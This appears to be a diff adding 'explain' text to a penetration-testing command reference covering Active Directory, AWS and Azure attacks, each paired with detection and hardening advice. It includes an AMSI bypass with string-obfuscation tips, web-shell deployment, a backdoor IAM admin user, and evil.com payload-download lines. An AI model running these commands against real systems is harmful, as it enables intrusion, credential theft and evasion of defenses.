@@ -566,7 +566,8 @@ const COMMAND_DATA = {
           "label": "Kerberoast them",
           "command": ".\\Rubeus.exe kerberoast /nowrap"
         }
-      ]
+      ],
+      "explain": "Finds Kerberoastable accounts via the ActiveDirectory module:\n  Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"}   users that have any SPN set\n  -Properties ServicePrincipalName                        also return the SPN value\n  | Select SamAccountName, ServicePrincipalName          the useful columns\nAny SPN user can be Kerberoasted (request a TGS, crack it offline); feed the names to Rubeus kerberoast or GetUserSPNs.py."
     },
     {
       "id": "ad-admodule-getaddomain",
@@ -668,7 +669,8 @@ const COMMAND_DATA = {
           "label": "Forest info",
           "command": "Get-ADForest | select Name,RootDomain,Domains,GlobalCatalogs"
         }
-      ]
+      ],
+      "explain": "Returns the domain's core identity from the ActiveDirectory module:\n  Get-ADDomain   query the current domain object\nGives the domain/NetBIOS name, domain SID, forest root, functional level, and PDC emulator; the domain SID here is what you need for an ExtraSids golden-ticket across a trust. Add -Identity <domain> to read another domain in the forest."
     },
     {
       "id": "ad-admodule-trust",
@@ -766,7 +768,8 @@ const COMMAND_DATA = {
           "label": "External/forest trusts only",
           "command": "Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'"
         }
-      ]
+      ],
+      "explain": "Lists this domain's trust relationships:\n  Get-ADTrust -Filter *   return every configured trust\nShows each trust's direction (Inbound/Outbound/Bidirectional), type (Forest/External/Realm), and whether SID filtering is on - the first thing to check before attempting a cross-domain/forest attack. Add -Server <domain> to read another domain's trusts."
     },
     {
       "id": "ad-admodule-import",
@@ -860,7 +863,8 @@ const COMMAND_DATA = {
           "label": "Import the DLL directly (no RSAT install)",
           "command": "Import-Module .\\Microsoft.ActiveDirectory.Management.dll"
         }
-      ]
+      ],
+      "explain": "Loads Microsoft's ActiveDirectory PowerShell module:\n  Import-Module ActiveDirectory   bring the Get-AD* cmdlets into the session\nRequires RSAT (or runs by default on a DC); once loaded you get authoritative, LDAP-backed enumeration cmdlets. Verify with 'Get-Module -Name ActiveDirectory'."
     },
     {
       "id": "ad-security-controls",
@@ -972,7 +976,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "If tools are blocked, switch to LOTL techniques using built-in Windows commands"
         }
-      ]
+      ],
+      "explain": "Enumerates host defenses after landing on a Windows box:\n  Get-MpComputerStatus   report Windows Defender real-time/AV state\nTells you what you are up against before dropping tools; the card also checks PowerShell language mode ($ExecutionContext.SessionState.LanguageMode - Constrained vs Full) and AppLocker rules (Get-AppLockerPolicy)."
     },
     {
       "id": "ad-lotl-enum",
@@ -1108,7 +1113,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "After built-in enumeration identifies targets, run SharpHound for comprehensive graph-based analysis."
         }
-      ]
+      ],
+      "explain": "Enumerates the host and domain using only built-in commands:\n  systeminfo   dump OS build, hotfixes, domain, and hardware info\nA living-off-the-land starting point when tools are blocked by AppLocker/AV; the card chains it with wmic qfe (patches), a PowerShell v2 downgrade to dodge logging, and native net/dsquery commands."
     },
     {
       "id": "ad-acl-decision-tree",
@@ -1783,7 +1789,8 @@ const COMMAND_DATA = {
         "misconfiguration": "GPP XML files with cpassword attribute still in SYSVOL (from pre-MS14-025 GPO creation). Sensitive scripts in SYSVOL. Non-standard shares with weak permissions. No monitoring of bulk SYSVOL access.",
         "vulnerable_config": "# GPP cpassword in SYSVOL (legacy - still present if never cleaned up):\n# \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n# <Properties action='U' newName='' fullName='' description=''\n#   cpassword='edBSHOwhZLTjt/QS9FeIcJ8m9MZfl7QEVF6vMJopZhI=' ...>\n# → gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ8m9MZfl7QEVF6vMJopZhI=' → cleartext password",
         "secure_config": "# Find and remove GPP cpassword files:\nGet-ChildItem -Path '\\\\corp.local\\SYSVOL' -Recurse -Include '*.xml' | Select-String 'cpassword'\n# Remove any files found OR remove the cpassword element\n\n# Microsoft KB2962486 (MS14-025) prevents NEW GPP passwords but doesn't remove old ones:\n# Must manually audit and clean SYSVOL\n\n# SIEM alert for GPP cpassword access:\n# Event 5140: ObjectName contains 'Groups.xml' OR 'DataSources.xml' OR 'ScheduledTasks.xml'\n# AND AccessMask=0x80 (read) → ALERT\n\n# Audit SYSVOL regularly:\nInvoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')\nGet-GPPPassword"
-      }
+      },
+      "explain": "Discovers domain shares and hunts SYSVOL for GPP passwords:\n  Find-DomainShare                        enumerate accessible SMB shares across every domain computer\n  ls \\\\<dc_host>\\sysvol\\<domain>\\Policies\\   browse the replicated policy files\nGPP files (Groups.xml etc.) can hold AES-encrypted cpassword values whose key Microsoft published - decrypt with gpp-decrypt for instant credentials; recurse and grep for Groups.xml/Services.xml/ScheduledTasks.xml."
     },
     {
       "id": "ad-netsession-loggedon",
@@ -1902,7 +1909,8 @@ const COMMAND_DATA = {
         "misconfiguration": "RestrictRemoteSam not configured (default - any auth user can enumerate sessions). DAs log on to regular workstations. No MDI. No PAW model.",
         "vulnerable_config": "# RestrictRemoteSam not set:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').RestrictRemoteSam  # $null\n\n# Any auth user can see who's logged on where:\nnet session \\\\workstation01\n# → CORP\\DomainAdmin1 logged on → target for PtH/token theft",
         "secure_config": "# Restrict NetSessionEnum to Administrators:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RestrictRemoteSam -Value 'O:BAG:BAD:(A;;RC;;;BA)'\n\n# Via GPO:\n# Computer Config → Windows Settings → Security Settings → Local Policies → Security Options\n# → Network access: Restrict clients allowed to make remote calls to SAM\n\n# Add DAs to Protected Users:\nAdd-ADGroupMember 'Protected Users' 'DomainAdmin1'"
-      }
+      },
+      "explain": "Finds active sessions and tests local admin rights with PowerView:\n  Get-NetSession -ComputerName <target>   list SMB sessions on the host (who is connected)\n  Find-LocalAdminAccess                    scan the domain for hosts where you are local admin\nTogether they show where privileged users are logged on and where you can already act as admin - the map for lateral movement and credential harvesting."
     },
     {
       "id": "ad-ps-ldap-query",
@@ -1997,7 +2005,8 @@ const COMMAND_DATA = {
           "https://attack.mitre.org/techniques/T1087/002/",
           "https://attack.mitre.org/techniques/T1069/002/"
         ]
-      }
+      },
+      "explain": "Enumerates AD with raw .NET DirectoryServices - no tools needed:\n  PdcRoleOwner.Name + distinguishedName   build an LDAP path to the PDC and domain root\n  New-Object DirectoryEntry($LDAP)         bind to the directory\n  DirectorySearcher.filter = \"(samAccountType=805306368)\"   filter (here: user accounts)\n  .FindAll()                               run the query\nA fully living-off-the-land LDAP query when PowerView/RSAT are unavailable; change the filter for other object classes."
     },
     {
       "id": "ad-dcom-exec",
@@ -2586,7 +2595,8 @@ const COMMAND_DATA = {
           "label": "Resolve records too",
           "command": "adidnsdump -u <domain>\\<user> -p <password> ldap://<dc_ip> -r"
         }
-      ]
+      ],
+      "explain": "Dumps every AD-Integrated DNS record over LDAP:\n  adidnsdump          the collector\n  -u <domain>\\<user>   authenticate as any domain user\n  ldap://<dc_ip>      the DC's LDAP service to query\n  -r                  resolve records the tool cannot read directly by querying them by node name\nWrites records.csv mapping internal hostnames to IPs (servers, infra that plain DNS lookups hide) - a fast internal map with only a low-priv account."
     },
     {
       "id": "crtp-adminsdholder",
@@ -3136,7 +3146,8 @@ const COMMAND_DATA = {
         "misconfiguration": "AMSI Tamper Protection not enabled. ETW not monitored. CLM not enforced. AMSI provider signatures not updated (stale - known bypasses not detected).",
         "vulnerable_config": "# Tamper Protection off:\n(Get-MpPreference).DisableTamperProtection  # True = tampering allowed\n# → amsiInitFailed reflection bypass succeeds without detection\n\n# CLM not enforced:\n$ExecutionContext.SessionState.LanguageMode  # FullLanguage\n# → reflection via [Ref].Assembly.GetType() fully accessible",
         "secure_config": "# Enable Tamper Protection:\n# Defender Security Center → Virus & threat protection settings → Tamper Protection: ON\n# Or via Intune/MDE\n\n# WDAC to enforce CLM on non-admin hosts:\n# CLM prevents: [Ref].Assembly.GetType() and other reflection-based bypasses\n\n# Monitor AMSI events:\n# SIEM: Microsoft-Windows-AMSI/Operational Event 1033 (scan error) → ALERT\n\n# ETW rule:\n# SilkETW + Microsoft-Windows-AMSI provider → log all AMSI bypass attempts"
-      }
+      },
+      "explain": "Disables AMSI in the current PowerShell process so in-memory scripts run unscanned:\n  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')   reflect the internal AMSI class\n  .GetField('amsiInitFailed','NonPublic,Static')                    grab its private init-failed flag\n  .SetValue($null,$true)                                            set it true so AMSI thinks init failed and stops scanning\nAfter this, IEX/download-cradle payloads load without Defender inspecting them; obfuscate the string ('Am'+'si'+'Utils') because the literal is itself signatured."
     },
     {
       "type": "command",
@@ -3260,7 +3271,8 @@ const COMMAND_DATA = {
           "command": "# In Antak web UI:\n# Type command in input box, click 'Encoded Run' to evade basic WAF\n# Antak base64-encodes and runs via -EncodedCommand",
           "label": "In Antak web UI: # Type command in…"
         }
-      ]
+      ],
+      "explain": "Deploys the Antak (Nishang) ASPX PowerShell web shell onto IIS:\n  cp /usr/share/nishang/Antak-WebShell/antak.aspx <upload_name>.aspx   copy the shell, ready to upload\nSet the username/password inside the file first; once uploaded to the target and browsed to, it gives a web console that runs PowerShell as the IIS app-pool identity."
     },
     {
       "id": "api-unrestricted-resource-consumption",
@@ -3477,7 +3489,8 @@ const COMMAND_DATA = {
         "idor",
         "enumeration",
         "authorization"
-      ]
+      ],
+      "explain": "Exploits Broken Object Level Authorization by walking sequential object IDs:\n  for ((i=1; i<=20; i++))   loop over numeric IDs\n  curl ... /api/v1/<endpoint>/$i   request each object using your own valid token\n  -H \"Authorization: Bearer <jwt_token>\"   authenticate as yourself\n  | jq   pretty-print the JSON\nResponses returning other users' data confirm BOLA (OWASP API1); enumerate first with /current-user to see your own object shape."
     },
     {
       "id": "api-ffuf-json-bruteforce",
@@ -3690,7 +3703,8 @@ const COMMAND_DATA = {
         "versioning",
         "enumeration",
         "improper-inventory"
-      ]
+      ],
+      "explain": "Probes retired API versions that skipped current security controls:\n  curl -s http://<target>/api/v0/<endpoint>   hit an old version path\n  -H \"Authorization: Bearer <jwt_token>\"     with your token\n  | jq                                       parse the response\nOld versions (v0, beta, legacy) often miss auth checks or expose deleted records (OWASP API9); loop 'for ver in v0 v1 v2 beta legacy internal' to find which endpoints still answer."
     },
     {
       "type": "command",
@@ -3784,7 +3798,8 @@ const COMMAND_DATA = {
           "MITRE T1046",
           "MITRE T1595.002"
         ]
-      }
+      },
+      "explain": "Sweeps a scope for common web/app ports with nmap:\n  -p 80,443,8000,8080,8180,8888,10000   HTTP and alternate HTTP ports\n  --open                                 only report open ports\n  -oA web_discovery                      save all output formats (the XML feeds screenshot tools)\n  -iL <scope_file>                       read targets from file\nBuilds the list of live web apps to triage; pipe web_discovery.xml into EyeWitness or Aquatone next."
     },
     {
       "id": "cdsa-m12-sigma-conversion",
@@ -3884,7 +3899,8 @@ const COMMAND_DATA = {
         "sigmac",
         "pySigma",
         "chainsaw"
-      ]
+      ],
+      "explain": "Converts a generic Sigma rule into a backend-specific query with sigmac:\n  python sigmac      the Sigma converter\n  -t powershell      target backend (here a Get-WinEvent PowerShell filter; also splunk, es-qs, qradar)\n  'C:\\Rules\\sigma\\rule.yml'   the Sigma rule to convert\nEmits a query you can run in that platform; add -c <config.yml> for field mappings, or use Chainsaw 'hunt' to apply the rule directly against .evtx logs."
     },
     {
       "type": "command",
@@ -3991,7 +4007,8 @@ const COMMAND_DATA = {
           "OWASP A02:2021"
         ],
         "evasion": "Capture and analyze the connection offline; replay only the crafted request needed, not a broad probe."
-      }
+      },
+      "explain": "Recovers a client's DB connection string by breakpointing the connect call in gdb:\n  gdb ./<binary>                    load the compiled client\n  b *<SQLDriverConnect_addr>         break at the ODBC connect function\n  run                               execute until the breakpoint, then inspect RDX for the connection string\nCatches the plaintext SERVER/UID/PWD as it is passed in memory; for .NET client DLLs, decompile with dnSpy instead."
     },
     {
       "type": "command",
@@ -4089,7 +4106,8 @@ const COMMAND_DATA = {
           "label": "Plain host list",
           "command": "cat hosts.txt | ./aquatone"
         }
-      ]
+      ],
+      "explain": "Screenshots web hosts from an Nmap XML for visual triage:\n  cat web_discovery.xml   the nmap XML from the discovery scan\n  | ./aquatone -nmap      parse it as nmap input and capture each host\nProduces an HTML gallery so you can eyeball many sites at once and spot login/admin/default pages; -ports large widens the port set."
     },
     {
       "id": "cdsa-m08-arp-attacks",
@@ -4986,7 +5004,8 @@ const COMMAND_DATA = {
         "misconfiguration": "AWS Account ID exposed in public S3 bucket policies or error messages. No CloudTrail alerting on AssumeRole failure bursts. Roles with predictable names (admin, developer, readonly) enable targeted guessing.",
         "vulnerable_config": "# Account ID exposed in public S3 bucket policy:\naws s3api get-bucket-policy --bucket public-bucket\n# → Principal: arn:aws:iam::123456789012:root → exposes account ID\n\n# No AssumeRole failure alerting:\n# CloudWatch: no metric filter for AssumeRole ErrorCode=AccessDenied\n# → Unlimited role name brute force from external accounts",
         "secure_config": "# Avoid account ID in public policies:\n# Use Principal: * (public) or reference by service, not account ID\n\n# CloudWatch alarm on AssumeRole failures:\n# Metric filter:\n# { $.eventName = 'AssumeRole' && $.errorCode = 'AccessDenied' }\n# Alarm: > 10 events in 5 minutes → SNS alert\n\n# SCP: restrict AssumeRole from external accounts:\n# {\n#   'Effect': 'Deny',\n#   'Action': 'sts:AssumeRole',\n#   'Resource': '*',\n#   'Condition': {\n#     'StringNotEquals': {'aws:PrincipalOrgID': 'o-xxxxxxxxxx'}\n#   }\n# }"
-      }
+      },
+      "explain": "Fingerprints an AWS account and probes for IAM users without target creds:\n  sts get-access-key-info --access-key-id <target_akid>   returns the 12-digit Account ID behind any access key (needs only your own profile)\n  s3 mb + put-bucket-policy referencing a target principal   a bucket policy naming a real user succeeds; a fake one errors MalformedPolicy\nLets you confirm the account ID and enumerate which IAM users/roles exist by policy-validation side channel - pure recon, no target authentication."
     },
     {
       "id": "aws-container-pivot",
@@ -5388,7 +5407,8 @@ const COMMAND_DATA = {
         "misconfiguration": "S3 Block Public Access not enabled. EC2 security groups allow 0.0.0.0/0 inbound on all ports. No VPC Flow Logs. No S3 access logging. GuardDuty not enabled.",
         "vulnerable_config": "# Public S3 bucket:\naws s3 ls s3://company-backup --no-sign-request\n# → Lists bucket contents without credentials = public read\n\n# EC2 security group allowing all:\naws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'\n# → All ports open from internet on EC2 instance",
         "secure_config": "# Block Public Access (account level):\naws s3control put-public-access-block --account-id ACCOUNT_ID \\\n  --public-access-block-configuration 'BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true'\n\n# Default-deny security groups:\n# Remove 0.0.0.0/0 inbound rules:\naws ec2 revoke-security-group-ingress --group-id sg-xxx --protocol all --cidr 0.0.0.0/0\n# Add only required ports from specific sources:\naws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 443 --cidr 0.0.0.0/0\n\n# Enable GuardDuty + Macie for S3 data discovery detection\naws guardduty create-detector --enable\naws macie2 enable-macie"
-      }
+      },
+      "explain": "Finds publicly shared AWS resources with the CLI:\n  s3 ls <bucket_name>   list a public bucket's objects (no auth needed for public buckets)\n  ec2 describe-images --executable-users all --filters \"Name=name,Values=*<keyword>*\"   AMIs shared with everyone\n  ec2 describe-snapshots --filters \"Name=description,Values=*<keyword>*\"   broadly shared EBS snapshots\nSurfaces data and machine images the account exposed - a frequent source of secrets and pre-baked credentials."
     },
     {
       "id": "aws-iam-full-dump",
@@ -5519,7 +5539,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Developer IAM policies include iam:List* and iam:Get* for '*' resource. No CloudTrail alerting on bulk IAM API calls. No IAM permissions boundaries. SCPs not used to restrict IAM actions.",
         "vulnerable_config": "# Overpermissive developer policy:\n# {\n#   'Effect': 'Allow',\n#   'Action': ['iam:List*', 'iam:Get*'],\n#   'Resource': '*'\n# }\n# → Developer can enumerate all IAM - maps escalation paths\n\n# No SCP restriction:\naws organizations list-policies-for-target --target-id ACCOUNT_ID --filter SERVICE_CONTROL_POLICY\n# → No SCP limiting iam:List* = any account member can enumerate",
         "secure_config": "# Least-privilege: developers don't need iam:List* on *\n# Restrict to their own user:\n# {\n#   'Effect': 'Allow',\n#   'Action': ['iam:GetUser', 'iam:ListAccessKeys'],\n#   'Resource': 'arn:aws:iam::ACCOUNT:user/${aws:username}'\n# }\n\n# SCP denying iam:List* for non-admin:\n# {\n#   'Effect': 'Deny',\n#   'Action': ['iam:List*', 'iam:Get*'],\n#   'Resource': '*',\n#   'Condition': {'StringNotEquals': {'aws:PrincipalArn': 'arn:aws:iam::ACCOUNT:role/IAMAdmin'}}\n# }\n\n# CloudWatch alarm on bulk IAM calls:\n# Metric filter: $.eventSource=iam.amazonaws.com AND $.errorCode='' (successful)\n# Alarm: > 50 IAM calls in 5 minutes from same principal → SNS alert"
-      }
+      },
+      "explain": "Dumps the entire IAM configuration in one call and slices it with JMESPath:\n  iam get-account-authorization-details --filter User Group LocalManagedPolicy Role   pull all users, groups, roles, and their attached policies\n  --query \"UserDetailList[].UserName\"   JMESPath to extract just the fields you want\nRequires iam:GetAccountAuthorizationDetails (in SecurityAudit/ReadOnlyAccess); tee the JSON, then query it offline to map who can do what and find escalation paths."
     },
     {
       "id": "aws-iam-scope-permissions",
@@ -5680,7 +5701,8 @@ const COMMAND_DATA = {
         "misconfiguration": "No alerting on iam:SimulatePrincipalPolicy. No CloudTrail enabled in all regions. IAM policies not reviewed for escalation paths (iam:PassRole, iam:CreatePolicyVersion, iam:AttachUserPolicy are common escalation primitives).",
         "vulnerable_config": "# IAM escalation path example - has PassRole + CreateFunction:\n# Attacker finds:\n# aws iam get-user-policy → allows lambda:CreateFunction + iam:PassRole\n# → Can create Lambda with admin role → PrivEsc to admin\n\n# IAM Access Analyzer not enabled:\naws accessanalyzer list-analyzers\n# → No analyzers = no proactive permission review",
         "secure_config": "# Enable IAM Access Analyzer:\naws accessanalyzer create-analyzer --analyzer-name account-analyzer --type ACCOUNT\n# → Identifies external access and cross-account resource sharing\n\n# CloudTrail alert on SimulatePrincipalPolicy:\n# CloudWatch metric filter:\n# { $.eventName = 'SimulatePrincipalPolicy' }\n# Alarm: any occurrence → immediate SNS alert\n\n# Review escalation paths with Cloudsplaining:\n# pip install cloudsplaining\n# aws iam get-account-authorization-details > iam-full.json\n# cloudsplaining scan --input iam-full.json --output report/\n# → Identifies dangerous permission combinations"
-      }
+      },
+      "explain": "Maps the exact permissions of a compromised AWS identity:\n  sts get-caller-identity                       find your username/role from the ARN\n  iam list-user-policies / list-attached-user-policies   inline and managed policies on the user\n  iam list-groups-for-user + list-attached-group-policies   policies inherited via groups\n  iam get-policy-version --policy-arn ... --version-id ...   read a managed policy's JSON\nAssembles the full effective policy set so you know your rights and where to escalate."
     },
     {
       "id": "aws-iam-privesc-backdoor",
@@ -5820,7 +5842,8 @@ const COMMAND_DATA = {
         "misconfiguration": "IAM users have iam:CreatePolicyVersion or iam:AttachUserPolicy for '*'. No permissions boundary enforced. No CloudTrail alerting on IAM write operations. SCPs don't restrict dangerous IAM actions.",
         "vulnerable_config": "# Escalation via CreatePolicyVersion:\naws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/DevPolicy \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' \\\n  --set-as-default\n# → DevPolicy now grants admin. Current user has DevPolicy = instant admin\n\n# Backdoor: create new admin user:\naws iam create-user --user-name backdoor-admin\naws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name backdoor-admin",
         "secure_config": "# Permissions boundary: cap max permissions even with iam:Attach*:\n# Create boundary policy (max allowed permissions):\naws iam create-policy --policy-name MaxPermBoundary --policy-document file://boundary.json\n# Apply to all created roles/users:\n# Any role created must have this boundary → cannot exceed it\n\n# SCP: deny iam:CreatePolicyVersion for non-admin:\n# {\n#   'Effect': 'Deny',\n#   'Action': 'iam:CreatePolicyVersion',\n#   'Resource': '*',\n#   'Condition': {\n#     'StringNotEquals': {'aws:PrincipalArn': 'arn:aws:iam::ACCOUNT:role/IAMAdmin'}\n#   }\n# }\n\n# CloudTrail alert: any IAM write operation:\n# { $.eventSource = 'iam.amazonaws.com' && $.readOnly = false }\n# Alert: every IAM modification → immediate review"
-      }
+      },
+      "explain": "Creates a full-admin backdoor IAM user when you hold the right IAM write permissions:\n  iam create-user --user-name backdoor                              make a new user\n  iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess   grant it full admin\n  iam create-access-key --user-name backdoor                        mint programmatic keys for it\nGives persistent credential-based admin access independent of the compromised identity; requires iam:CreateUser/AttachUserPolicy/CreateAccessKey (check yours first with get-caller-identity + list-attached-user-policies)."
     },
     {
       "id": "aws-jenkins-pipeline-rce",
@@ -6109,7 +6132,8 @@ const COMMAND_DATA = {
         "misconfiguration": "GuardDuty not enabled. No CloudTrail alerting. Broad IAM permissions allowing enumeration of many services. No SCP restrictions limiting service access per role type.",
         "vulnerable_config": "# GuardDuty not enabled:\naws guardduty list-detectors\n# → Detectors: [] (no detectors = blind to Pacu anomalies)\n\n# No CloudTrail in all regions:\naws cloudtrail describe-trails | python3 -c 'import sys,json; t=json.load(sys.stdin)[\"trailList\"]; print([x[\"IsMultiRegionTrail\"] for x in t])'\n# → [False] = single-region trail, misses Pacu calls in other regions",
         "secure_config": "# Enable GuardDuty in all regions:\nfor region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do\n  aws guardduty create-detector --enable --region $region\ndone\n\n# Enable multi-region CloudTrail:\naws cloudtrail create-trail --name organization-trail --s3-bucket-name org-cloudtrail-logs --is-multi-region-trail --enable-log-file-validation\naws cloudtrail start-logging --name organization-trail\n\n# CloudWatch alarm: API call burst:\n# Metric: CloudTrail event count per user per 5 minutes\n# Alarm: > 100 API calls in 5 min from single ARN → SNS alert"
-      }
+      },
+      "explain": "Automates AWS post-exploitation enumeration with the Pacu framework:\n  pacu                     launch (creates/opens a named session backed by SQLite)\n  import_keys <profile>    load creds from an aws CLI profile\n  run iam__enum_users_roles_policies_groups   enumerate the IAM landscape\n  run iam__enum_permissions   resolve what the current identity can do\n  data IAM                 view the collected data\nGives structured, stored enumeration and a launchpad for Pacu's attack modules."
     },
     {
       "id": "aws-pypi-supply-chain",
@@ -6617,7 +6641,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Long-term IAM access keys created and not rotated. Keys embedded in code, .env files, or CI/CD pipelines. No CloudTrail in all regions. GuardDuty not enabled. No IP-condition policy on sensitive credentials.",
         "vulnerable_config": "# IAM user with long-term access keys:\naws iam list-access-keys --user-name developer\n# → AccessKeyId: AKIAIOSFODNN7EXAMPLE, Status: Active, CreateDate: 2020-01-01\n# Created in 2020, never rotated = long-lived credential risk\n\n# No credential policy restricting source IP:\n# Policy missing Condition: IpAddress aws:SourceIp restriction\n# → Key works from any IP worldwide",
         "secure_config": "# Enforce MFA + IP restriction on IAM user:\n# IAM policy condition:\n# {\n#   'Condition': {\n#     'Bool': {'aws:MultiFactorAuthPresent': 'true'},\n#     'IpAddress': {'aws:SourceIp': ['10.0.0.0/8', '203.0.113.0/24']}\n#   }\n# }\n\n# AWS Config rule: no long-term access keys for root:\naws configservice put-config-rule --config-rule file://no-root-access-key.json\n\n# Prefer IAM roles over access keys:\n# For EC2: attach IAM role → credentials via IMDS (auto-rotated)\n# For humans: AWS SSO with SAML → temporary credentials only\n\n# Alert on credential report: keys older than 90 days:\naws iam generate-credential-report\naws iam get-credential-report | base64 -d | grep AKIA | awk -F, '$10>90{print $1,$10}'"
-      }
+      },
+      "explain": "Configures the AWS CLI with obtained keys and confirms whose they are:\n  aws configure --profile <name>   store the access key id + secret under a named profile\n  aws --profile <name> sts get-caller-identity   ask AWS who this identity is\nget-caller-identity returns the UserId, 12-digit Account, and full IAM ARN - your starting point for scoping permissions; keys go in ~/.aws/credentials."
     },
     {
       "id": "aws-domain-cloud-recon",
@@ -6743,7 +6768,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Internal service subdomains in public DNS (staging.internal.corp.com resolves publicly). Unused S3 bucket CNAMEs still in DNS. Test/dev environments exposed via DNS. No monitoring of certificate transparency for unauthorized certs.",
         "vulnerable_config": "# Internal subdomains visible in public DNS:\ndig +short internal-api.corp.com\n# → 10.0.1.5 (internal IP leaked in public DNS)\n\n# S3 bucket in DNS (potentially public):\nnslookup assets.corp.com\n# → CNAME: assets.corp.com.s3.amazonaws.com\n# → Check if bucket is public: aws s3 ls s3://assets.corp.com --no-sign-request",
         "secure_config": "# Monitor your certificate transparency exposure:\n# CertSpotter alerting (sslmate.com/certspotter):\n# Subscribe to alerts for *.corp.com\n# → Alert when any new cert issued for your domain\n\n# Audit public DNS records:\n# amass enum -passive -d corp.com > public_subdomains.txt\n# Review: remove internal/unused entries from public DNS\n\n# Split-horizon DNS: internal names only resolve on internal DNS\n# Public DNS: only expose intentionally public endpoints\n\n# Enable Block Public Access at AWS account level (prevents all public S3)"
-      }
+      },
+      "explain": "Identifies AWS infrastructure before you have any credentials:\n  host -t ns <domain>   NS records ending in awsdns-* confirm Route 53\n  host <ip>             reverse lookups resolving to ec2-*.compute.amazonaws.com confirm EC2 (and the region)\n  cloud_enum -k <keyword> --quickscan --disable-azure --disable-gcp   brute public S3/cloud resources by keyword\nMaps the target's AWS footprint passively so you know what to attack once you get in."
     },
     {
       "id": "azure-authentication",
@@ -6844,7 +6870,8 @@ const COMMAND_DATA = {
         "misconfiguration": "No Conditional Access / MFA; long-lived service-principal secrets; over-privileged users/SPs.",
         "vulnerable_config": "# SP with a long-lived secret and Contributor at subscription scope, no CA/MFA:\naz login --service-principal -u <app_id> -p <secret> --tenant <tid>   # succeeds from anywhere",
         "secure_config": "# Enforce Conditional Access + MFA; block ROPC/legacy auth.\n# Use managed identities or cert-based SP auth; rotate secrets; scope RBAC to least privilege."
-      }
+      },
+      "explain": "Authenticates to Azure/Entra as a compromised service principal:\n  az login --service-principal   non-interactive SP login\n  -u <app_id> -p <secret>        the app's client id and secret\n  --tenant <tenant_id>           the directory to sign into\nEstablishes a session for ARM/Entra enumeration; interactive 'az login' (or --use-device-code) works for user creds, and 'az account get-access-token' extracts a bearer token for raw API calls."
     },
     {
       "id": "azure-managed-identity-token",
@@ -7065,7 +7092,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Broad Reader/Contributor at high scope; Owner or User Access Administrator granted to non-admins; unreviewed custom roles with wildcard actions.",
         "vulnerable_config": "# Contributor at subscription scope can enumerate everything and run most resource actions:\naz role assignment list --assignee <me> --all   # shows Contributor / Subscription scope",
         "secure_config": "# Scope RBAC tightly (resource-group not subscription); use PIM; review custom roles for wildcard actions;\n# alert on roleAssignments list/write spikes in Activity Log."
-      }
+      },
+      "explain": "Enumerates the Azure Resource Manager layer with the az CLI:\n  az resource list -o table   list every resource your principal can see\nThe card walks accounts/subscriptions (az account list), resource groups (az group list), and - most importantly - RBAC via 'az role assignment list --all' and role definitions to find what you can do and where to escalate."
     },
     {
       "type": "command",
@@ -7375,7 +7403,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Encodes a file to text so you can carry it through a shell with no file transfer:\n  cat id_rsa    read the file bytes\n  base64 -w 0   encode to one unwrapped line (no newlines to break the paste)\n  echo          print a trailing newline so the blob is easy to select\nCopy the text to the other host and decode it back (base64 -d on Linux, [Convert]::FromBase64String on Windows); md5sum both ends to prove nothing was truncated."
     },
     {
       "type": "command",
@@ -7582,7 +7611,8 @@ const COMMAND_DATA = {
